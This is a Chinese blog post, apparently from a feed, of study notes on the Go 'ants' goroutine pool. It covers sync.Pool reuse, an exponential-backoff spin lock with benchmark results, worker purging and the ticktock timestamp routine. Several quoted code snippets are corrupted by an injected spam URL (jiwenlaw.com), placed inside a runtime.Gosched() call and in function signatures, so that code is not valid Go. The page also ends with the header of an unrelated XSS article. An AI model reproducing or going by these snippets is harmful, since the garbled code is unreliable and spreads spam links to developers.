<meta itemprop="url" content="https://juejin.cn/user/4100515739233513"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            go ants pool 协程池学习笔记 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4100515739233513/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    用户722786812344
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T04:54:29.000Z" title="Mon Nov 24 2025 04:54:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">概述</h2>
<p>使用 Go 开发并发程序很容易，一个 <code>go</code> 关键字就可以启动协程处理任务。Go 创建一个 goroutine 只需要 2K 内存空间，并且 go 协程上下文信息仅存储在两个寄存器中，对于 Go 运行时来说，切换上下文特别快。</p>
<p>不过凡事不加限制就会出问题，如果不加节制的滥用 goroutine 就可能导致内存泄露，增加 Go 运行时调度负担等。</p>
<p>下面看一段 Go http 标准库的代码：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(s *Server)</span></span> Serve(l net.Listener) <span class="hljs-type">error</span> {
	<span class="hljs-keyword">for</span> {
	   ...
	   c := s.newConn(rw)
	   <span class="hljs-keyword">go</span> c.serve(connCtx)  
	}  
}
</code></pre>
<p>当来一个 http 请求，http 会启动一个协程 <code>Server.serve()</code> 处理该请求。<br/>
这种方式对于请求的响应很快，但是如果有恶意大规模并发请求，就可能导致后端服务内存爆增，响应慢等问题。</p>
<p>测试千万并发的内存使用情况如下：</p>
<pre><code class="hljs language-scss" lang="scss">const n = <span class="hljs-number">10000000</span>
    
func <span class="hljs-built_in">demoFunc</span>() {  
    <span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.Sleep</span>(time.Duration(BenchParam) * <span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.Millisecond</span>)  
}

func <span class="hljs-built_in">TestNoPool</span>(t *testing.T) {  
    <span class="hljs-selector-tag">var</span> start, end runtime<span class="hljs-selector-class">.MemStats</span>  
    runtime<span class="hljs-selector-class">.ReadMemStats</span>(&amp;start)  
    <span class="hljs-selector-tag">var</span> wg sync<span class="hljs-selector-class">.WaitGroup</span>  
    for <span class="hljs-selector-tag">i</span> := <span class="hljs-number">0</span>; <span class="hljs-selector-tag">i</span> &lt; n; <span class="hljs-selector-tag">i</span>++ {  
       wg<span class="hljs-selector-class">.Add</span>(<span class="hljs-number">1</span>)  
       go <span class="hljs-built_in">func</span>() {  
          <span class="hljs-built_in">demoFunc</span>()  
          wg<span class="hljs-selector-class">.Done</span>()  
       }()  
    }  
    wg<span class="hljs-selector-class">.Wait</span>()  
    runtime<span class="hljs-selector-class">.ReadMemStats</span>(&amp;end)  
    usageMem := end.TotalAlloc/MiB - start.TotalAlloc/MiB  
    t.<span class="hljs-built_in">Logf</span>(<span class="hljs-string">"memory usage:%d MB"</span>, usageMem)  
}
</code></pre>
<p>测试结果：</p>
<pre><code class="hljs language-diff" lang="diff"> go test -v -bench=. -benchmem -run=TestNoPool
<span class="hljs-comment">=== RUN   TestNoPool</span>
    ants_test.go:41: memory usage:1304 M
<span class="hljs-comment">--- PASS: TestNoPool (5.70s）</span>
</code></pre>
<p>当并发量到千万时，内存使用率达到了 1 个多 G，看起来好像不多。不过可别忘了，这里处理的任务只是 <code>time.Sleep</code>，如果每个协程处理内存型或 IO 型任务，那该是多大内存或者 CPU 的消耗，并且调度如此多的协程也会让 Go 运行时（调度器，GC）的压力非常大。</p>
<p>因此，需要协程池来限制协程的使用，起到稳定内存使用率，减轻 Go 运行时负担的目的。</p>
<h2 data-id="heading-1">协程池</h2>
<p>既然协程池的主要任务是限制协程的数量，那么作为池应该有几个需求是要实现的：</p>
<ul>
<li>协程池生命周期管理，包括创建，释放等操作；</li>
<li>协程池的扩缩容，按需使用；</li>
<li>协程池中过期协程的清理；</li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpanjf2000%2Fants" target="_blank" title="https://github.com/panjf2000/ants" ref="nofollow noopener noreferrer">ants</a> 是一个满足上述需求的高性能协程池。本文重点学习 <code>ants</code> 的源码了解协程池。</p>
<h2 data-id="heading-2">ants 协程池</h2>
<h3 data-id="heading-3">结构</h3>
<p>首先看代码的层次结构，作为一个协程池库，ants 很扁平，只有一层：</p>
<pre><code class="hljs language-go" lang="go">tree
.
├── CODE_OF_CONDUCT.md
├── CONTRIBUTING.md
├── LICENSE
├── README.md
├── README_ZH.md
├── ants.<span class="hljs-keyword">go</span>
├── ants_benchmark_test.<span class="hljs-keyword">go</span>
├── ants_test.<span class="hljs-keyword">go</span>
├── example_test.<span class="hljs-keyword">go</span>
├── <span class="hljs-keyword">go</span>.mod
├── <span class="hljs-keyword">go</span>.sum
├── multipool.<span class="hljs-keyword">go</span>
├── multipool_func.<span class="hljs-keyword">go</span>
├── multipool_func_generic.<span class="hljs-keyword">go</span>
├── options.<span class="hljs-keyword">go</span>
├── pkg
│   └── sync
│       ├── spinlock.<span class="hljs-keyword">go</span>
│       ├── spinlock_test.<span class="hljs-keyword">go</span>
│       └── sync.<span class="hljs-keyword">go</span>
├── pool.<span class="hljs-keyword">go</span>
├── pool_func.<span class="hljs-keyword">go</span>
├── pool_func_generic.<span class="hljs-keyword">go</span>
├── worker.<span class="hljs-keyword">go</span>
├── worker_func.<span class="hljs-keyword">go</span>
├── worker_func_generic.<span class="hljs-keyword">go</span>
├── worker_loop_queue.<span class="hljs-keyword">go</span>
├── worker_loop_queue_test.<span class="hljs-keyword">go</span>
├── worker_queue.<span class="hljs-keyword">go</span>
├── worker_stack.<span class="hljs-keyword">go</span>
└── worker_stack_test.<span class="hljs-keyword">go</span>
</code></pre>
<p>从结构可以看出，主要分为三类：</p>
<ul>
<li>pool：实现了协程池，是暴露给用户调用的对象；</li>
<li>workqueue：工作队列，负责装载工作协程，其接口实现是 <code>worker_stack</code> 和 <code>worker_loop_queue</code> 对象；</li>
<li>worker：工作协程，是实际执行任务的协程；</li>
</ul>
<p>这个结构还是很清晰的，就不画 UML 图表示了。</p>
<h3 data-id="heading-4">流程</h3>
<h4 data-id="heading-5">设计</h4>
<p>在看流程图之前，先自己想一下，如果让我设计协程池该如何做呢？</p>
<p>平时开发用的比较多的是类似这样的写法：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; workerNumber; i++ {
	<span class="hljs-keyword">go</span> worker()
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">worker</span><span class="hljs-params">()</span></span> {
	<span class="hljs-keyword">for</span> task := <span class="hljs-keyword">range</span> taskC {
		doTask()
	}
}
</code></pre>
<p>程序运行时启动 <code>workerNumber</code> 个协程监听同一个通道 <code>taskC</code>，如果 <code>taskC</code> 有 <code>task</code>，多个协程 <code>worker</code> 会抢 <code>task</code> 并调用 <code>doTask()</code> 处理任务。</p>
<p>这种写法的好处在于简单，缺点在于协程数固定，不能按需灵活使用，而且在程序启动时，<code>workerNumber</code> 个协程就开始运行，如果没有 <code>task</code> 会造成资源浪费。</p>
<p>这种写法对于数量少的协程还行，如果并发过大则需要上协程池了。</p>
<p>使用协程池，还是让 <code>worker</code> 去监听 <code>taskC</code>，不同的是每个 <code>worker</code> 都有自己的 <code>taskC</code>，这样设计的好处是协程 <code>worker</code> 不会打架。</p>
<p>让每个 <code>worker</code> 监听自己的通道，那谁来管理这些 <code>worker</code> 呢？我们可以将这些 <code>worker</code> 存入容器（堆或栈）中。让容器对象来管理 <code>worker</code>，包括插入 <code>worker</code> 到容器，弹出 <code>worker</code> 出容器等。</p>
<p>现在 <code>worker</code> 在容器中了，那什么时候该插入 <code>worker</code> 到容器，什么时候该弹出 <code>worker</code> 呢？</p>
<p>我们想每个 <code>worker</code> 都监听自己的通道，如果 <code>worker</code> 执行完任务就可以插入 <code>worker</code> 到容器，插入 <code>worker</code> 到容器的意思是，该 <code>worker</code> 可用，可以被拿出来执行任务。<br/>
这是插入逻辑，对于弹出，如果生产者需要往 <code>worker</code> 的通道中写任务，发现容器中有一个 <code>worker</code> 可用，就可以从容器中弹出 <code>worker</code> 给生产者使用。弹出的意思是，该 <code>worker</code> 我用了，别人不能在用了。</p>
<p>那么，谁是生产者呢？<br/>
生产者是客户端调用 <code>pool</code> 方法将任务写入 <code>pool</code> 对象，<code>pool</code> 对象从容器中获取可用的 <code>worker</code>，并往该 <code>worker</code> 的通道写入任务。</p>
<p>至此，主要的逻辑都走通了。</p>
<p>还有一点是容器该用栈还是用队列呢？<br/>
<code>worker</code> 写入容器后，如果长时间不用的话需要清理，清理需要按照时间排序。队列是符合这种需求的数据结构（按时间顺序，先进先出）。</p>
<h4 data-id="heading-6">流程图</h4>
<p><code>ants</code> 的流程图如下：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5ed176a6f7044758ced8c8e728b7a97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3NzIyNzg2ODEyMzQ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764564869&amp;x-signature=WwLEt%2F%2Bvl93wjZfXD%2Fzd87xvD9E%3D" alt="ants_pool" loading="lazy"/></p>
<p><em>图片来源于 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fpanjf2000%2Fants%2Fblob%2Fdev%2FREADME_ZH.md" target="_blank" title="https://github.com/panjf2000/ants/blob/dev/README_ZH.md" ref="nofollow noopener noreferrer">Github ants</a></em></p>
<p>结合图片看源码应该会很清晰，这里不在赘述了。</p>
<h3 data-id="heading-7">ants 源码实现</h3>
<p>光了解流程还不够，<code>ants</code> 能在众多协程池中脱颖而出，肯定有它的过人之处。下面从细节出发看源码中有哪些过人之处，毕竟细节是魔鬼。</p>
<h4 data-id="heading-8">sync.Pool 对象复用</h4>
<p>作为协程池，需要频繁创建 <code>worker</code> 对象。<code>ants</code> 使用 <code>sync.Pool</code> 作为对象缓存，复用 <code>worker</code> 对象，降低频繁创建销毁对象导致的内存开销。</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> poolCommon <span class="hljs-keyword">struct</span> {
	workerCache sync.Pool
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">NewPool</span><span class="hljs-params">(size <span class="hljs-type">int</span>, options ...Option)</span></span> (*Pool, <span class="hljs-type">error</span>) {  
    ...
    
    <span class="hljs-comment">// sync.Pool 创建对象</span>
    pool.workerCache.New = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> any {  
       <span class="hljs-keyword">return</span> &amp;goWorker{  
          pool: pool,  
          task: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span>, workerChanCap),  
       }  
    }  
  
    <span class="hljs-keyword">return</span> pool, <span class="hljs-literal">nil</span>  
}

<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *poolCommon)</span></span> retrieveWorker() (w worker, err <span class="hljs-type">error</span>) {
	...
	<span class="hljs-keyword">if</span> capacity := p.Cap(); capacity == <span class="hljs-number">-1</span> || capacity &gt; p.Running() {  
    p.lock.Unlock()  
    <span class="hljs-comment">// 从 sync.Pool 中取 worker 对象</span>
    w = p.workerCache.Get().(worker)  
    w.run()  
    <span class="hljs-keyword">return</span>  
}
</code></pre>
<h4 data-id="heading-9">sync.spinLock</h4>
<p><code>ants</code> 实现了指数退避锁，如下：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-keyword">type</span> spinLock <span class="hljs-type">uint32</span>  
  
<span class="hljs-keyword">const</span> maxBackoff = <span class="hljs-number">16</span>  
  
<span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(sl *spinLock)</span></span> Lock() {  
    backoff := <span class="hljs-number">1</span>  
    <span class="hljs-keyword">for</span> !atomic.CompareAndSwapUint32((*<span class="hljs-type">uint32</span>)(sl), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) {  
       <span class="hljs-comment">// Leverage the exponential backoff algorithm, see https://en.wikipedia.org/wiki/Exponential_backoff.  </span>
       <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; backoff; i++ {  
          runtime.Gosched(https:<span class="hljs-comment">//www.jiwenlaw.com/)  </span>
       }  
       <span class="hljs-keyword">if</span> backoff &lt; maxBackoff {  
          backoff &lt;&lt;= <span class="hljs-number">1</span>  
       }  
    }  
}
</code></pre>
<p>作为高并发协程池，多个协程抢锁是常态。如果协程长期占有锁，其它协程一直在抢锁会造成资源浪费。<code>ants</code> 使用指数退避算法抢锁减少长时间占有锁的资源抢占。</p>
<p>并且，当抢不到锁时 <code>ants</code> 使用 <code>runtime.Gosched</code> 出让 <code>CPU</code>，而不是空转等待锁（空转协程会一直占用 CPU）。主动出让，而不是被动等待运行时请出 CPU 更加合理且快速，也让其它协程更快的执行抢占逻辑，雨露均沾。</p>
<p>执行基准测试看几种类型锁的执行性能：</p>
<pre><code class="hljs language-scss" lang="scss">func <span class="hljs-built_in">BenchmarkMutex</span>(b *testing.B) {  
    m := sync.Mutex{}  
    <span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.RunParallel</span>(func(pb *testing.PB) {  
       for pb<span class="hljs-selector-class">.Next</span>() {  
          m<span class="hljs-selector-class">.Lock</span>()  
          <span class="hljs-comment">//nolint:staticcheck  </span>
          m<span class="hljs-selector-class">.Unlock</span>()  
       }  
    })  
}  
  
type spinLock uint32  
  
func (s *spinLock) <span class="hljs-built_in">Lock</span>() {  
    for !atomic<span class="hljs-selector-class">.CompareAndSwapUint32</span>((*uint32)(s), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) {  
    }  
}  
  
func (s *spinLock) <span class="hljs-built_in">Unlock</span>() {  
    atomic<span class="hljs-selector-class">.StoreUint32</span>((*uint32)(s), <span class="hljs-number">0</span>)  
}  
  
func <span class="hljs-built_in">newSpinLock</span>() *spinLock {  
    return (*spinLock)(new(uint32))  
}  
  
func <span class="hljs-built_in">BenchmarkSpinLock</span>(b *testing.B) {  
    m := <span class="hljs-built_in">newSpinLock</span>()  
    b.<span class="hljs-built_in">RunParallel</span>(<span class="hljs-built_in">func</span>(pb *testing.PB) {  
       for pb<span class="hljs-selector-class">.Next</span>() {  
          m<span class="hljs-selector-class">.Lock</span>()  
          <span class="hljs-comment">//nolint:staticcheck  </span>
          m<span class="hljs-selector-class">.Unlock</span>()  
       }  
    })  
}  
  
type backoffSpinLock uint32  
  
<span class="hljs-selector-tag">var</span> backoff = <span class="hljs-number">16</span>  
  
func (s *backoffSpinLock) <span class="hljs-built_in">Lock</span>() {  
    <span class="hljs-selector-tag">i</span> := <span class="hljs-number">1</span>  
    for !atomic.<span class="hljs-built_in">CompareAndSwapUint32</span>((*uint32)(s), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) {  
       if <span class="hljs-selector-tag">i</span> == backoff {  
          continue  
       }  
       <span class="hljs-selector-tag">i</span> &lt;&lt;= <span class="hljs-number">1</span>  
    }  
}  
  
func (s *backoffSpinLock) <span class="hljs-built_in">Unlock</span>() {  
    atomic<span class="hljs-selector-class">.StoreUint32</span>((*uint32)(s), <span class="hljs-number">0</span>)  
}  
  
func <span class="hljs-built_in">newBackoffSpinLock</span>() *backoffSpinLock {  
    return (*backoffSpinLock)(new(uint32))  
}  
  
func <span class="hljs-built_in">BenchmarkBackoffSpinLock</span>(b *testing.B) {  
    m := <span class="hljs-built_in">newBackoffSpinLock</span>()  
    b.<span class="hljs-built_in">RunParallel</span>(<span class="hljs-built_in">func</span>(pb *testing.PB) {  
       for pb<span class="hljs-selector-class">.Next</span>() {  
          m<span class="hljs-selector-class">.Lock</span>()  
          <span class="hljs-comment">//nolint:staticcheck  </span>
          m<span class="hljs-selector-class">.Unlock</span>()  
       }  
    })  
}  
  
type spinSchedLock uint32  
  
func (s *spinSchedLock) <span class="hljs-built_in">Lock</span>() {  
    for !atomic<span class="hljs-selector-class">.CompareAndSwapUint32</span>((*uint32)(s), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) {  
       runtime<span class="hljs-selector-class">.Gosched</span>()  
    }  
}  
  
func (s *spinSchedLock) <span class="hljs-built_in">Unlock</span>() {  
    atomic<span class="hljs-selector-class">.StoreUint32</span>((*uint32)(s), <span class="hljs-number">0</span>)  
}  
  
func <span class="hljs-built_in">newSpinSchedLock</span>() *spinSchedLock {  
    return (*spinSchedLock)(new(uint32))  
}  
  
func <span class="hljs-built_in">BenchmarkSpinSchedLock</span>(b *testing.B) {  
    m := <span class="hljs-built_in">newSpinSchedLock</span>()  
    b.<span class="hljs-built_in">RunParallel</span>(<span class="hljs-built_in">func</span>(pb *testing.PB) {  
       for pb<span class="hljs-selector-class">.Next</span>() {  
          m<span class="hljs-selector-class">.Lock</span>()  
          <span class="hljs-comment">//nolint:staticcheck  </span>
          m<span class="hljs-selector-class">.Unlock</span>()  
       }  
    })  
}  
  
type backoffSpinSchedLock uint32  
  
<span class="hljs-selector-tag">var</span> maxBackoff = <span class="hljs-number">16</span>  
  
func (s *backoffSpinSchedLock)https://www.jiwenlaw.com/ <span class="hljs-built_in">Lock</span>() {  
    backoff := <span class="hljs-number">1</span>  
    for !atomic.<span class="hljs-built_in">CompareAndSwapUint32</span>((*uint32)(s), <span class="hljs-number">0</span>, <span class="hljs-number">1</span>) {  
       for <span class="hljs-selector-tag">i</span> := <span class="hljs-number">0</span>; <span class="hljs-selector-tag">i</span> &lt; backoff; <span class="hljs-selector-tag">i</span>++ {  
          runtime<span class="hljs-selector-class">.Gosched</span>()  
       }  
       if backoff &lt; maxBackoff {  
          backoff &lt;&lt;= <span class="hljs-number">1</span>  
       }  
    }  
}  
  
func (s *backoffSpinSchedLock) <span class="hljs-built_in">Unlock</span>() {  
    atomic<span class="hljs-selector-class">.StoreUint32</span>((*uint32)(s), <span class="hljs-number">0</span>)  
}  
  
func <span class="hljs-built_in">newBackoffSpinSchedLock</span>() *backoffSpinSchedLock {  
    return (*backoffSpinSchedLock)(new(uint32))  
}  
  
func <span class="hljs-built_in">BenchmarkBackoffSpinSchedLock</span>(b *testing.B) {  
    m := <span class="hljs-built_in">newBackoffSpinSchedLock</span>()  
    b.<span class="hljs-built_in">RunParallel</span>(<span class="hljs-built_in">func</span>(pb *testing.PB) {  
       for pb<span class="hljs-selector-class">.Next</span>() {  
          m<span class="hljs-selector-class">.Lock</span>()  
          <span class="hljs-comment">//nolint:staticcheck  </span>
          m<span class="hljs-selector-class">.Unlock</span>()  
       }  
    })  
}
</code></pre>
<p>测试结果：</p>
<pre><code class="hljs language-bash" lang="bash"> go <span class="hljs-built_in">test</span> -v -bench=. -benchmem -run=^$
goos: darwin
goarch: arm64
pkg: github.com/xiahuyun/go-library/ants
cpu: Apple M3
BenchmarkMutex
BenchmarkMutex-8                        17903019                69.40 ns/op            0 B/op          0 allocs/op
BenchmarkSpinLock
BenchmarkSpinLock-8                     15894223               130.3 ns/op             0 B/op          0 allocs/op
BenchmarkBackoffSpinLock
BenchmarkBackoffSpinLock-8              10448190               124.0 ns/op             0 B/op          0 allocs/op
BenchmarkSpinSchedLock
BenchmarkSpinSchedLock-8                339347601                3.026 ns/op           0 B/op          0 allocs/op
BenchmarkBackoffSpinSchedLock
BenchmarkBackoffSpinSchedLock-8         400970906                2.641 ns/op           0 B/op          0 allocs/op
</code></pre>
<p>可以看到在众多锁中 <code>ants</code> 的指数退避锁表现最好。</p>
<h4 data-id="heading-10">purge worker</h4>
<p><code>ants</code> 使用一个清理协程定时清理 <code>workerQueue</code> 中的协程（ants 通过二分查找确定哪些协程是过期需要清理的，非常高效）：</p>
<h4 data-id="heading-11">ticktock</h4>
<p><code>ants</code> 中 <code>worker</code> 在放入队列时需要记录自己放入队列的时间，<code>purgeWorker</code> 会根据该时间确定哪些 <code>worker</code> 需要清理。</p>
<p>如果每个 <code>worker</code> 调用 <code>time.Now()</code> 记录时间，会造成系统资源浪费，<code>time.Now</code> 会执行系统调用，涉及内核态/用户态的切换。</p>
<p><code>ants</code> 使用 <code>ticktock</code> 协程周期性的调用 <code>time.Now</code> 生成时间戳并存到 <code>pool</code> 对象池中。<code>worker</code> 在记录时间放入队列时，只需要从对象池拿时间戳就行，显著避免系统资源消耗：</p>
<pre><code class="hljs language-go" lang="go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(p *poolCommon)</span></span> ticktock() {  https:<span class="hljs-comment">//www.jiwenlaw.com/</span>
    ticker := time.NewTicker(nowTimeUpdateInterval)  
    <span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {  
       ticker.Stop()  
       atomic.StoreInt32(&amp;p.ticktockDone, <span class="hljs-number">1</span>)  
    }()  
  
    ticktockCtx := p.ticktockCtx <span class="hljs-comment">// copy to the local variable to avoid race from Reboot()  </span>
    <span class="hljs-keyword">for</span> {  
       <span class="hljs-keyword">select</span> {  
       <span class="hljs-keyword">case</span> &lt;-ticktockCtx.Done():  
          <span class="hljs-keyword">return</span>  
       <span class="hljs-keyword">case</span> &lt;-ticker.C:  
       }  
  
       <span class="hljs-keyword">if</span> p.IsClosed() {  
          <span class="hljs-keyword">break</span>  
       }  
  
	   <span class="hljs-comment">// 记录当前时间到 pool 对象池</span>
       p.now.Store(time.Now())  
    }  
}
</code></pre>
<h2 data-id="heading-12">总结</h2>
<p><code>ants</code> 是一个被广泛使用的高性能协程池，特别适合学习，了解协程池的实现。本文从整体到细节介绍 <code>ants</code> 的实现，希望对大家有所帮助，感谢。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[安全小白入门(2)-----跨站脚本（XSS）]]></title>    <link>https://juejin.cn/post/7575937594350977067</link>    <guid>https://juejin.cn/post/7575937594350977067</guid>    <pubDate>2025-11-24T05:24:33.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575937594350977067" data-draft-id="7575937594350927915" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="安全小白入门(2)-----跨站脚本（XSS）"/> <meta itemprop="keywords" content="安全,前端,后端"/> <meta itemprop="datePublished" content="2025-11-24T05:24:33.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="天下不喵"/> <meta itemprop="url" content="https://juejin.cn/user/9257993379453"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            安全小白入门(2)-----跨站脚本（XSS）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/9257993379453/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    天下不喵
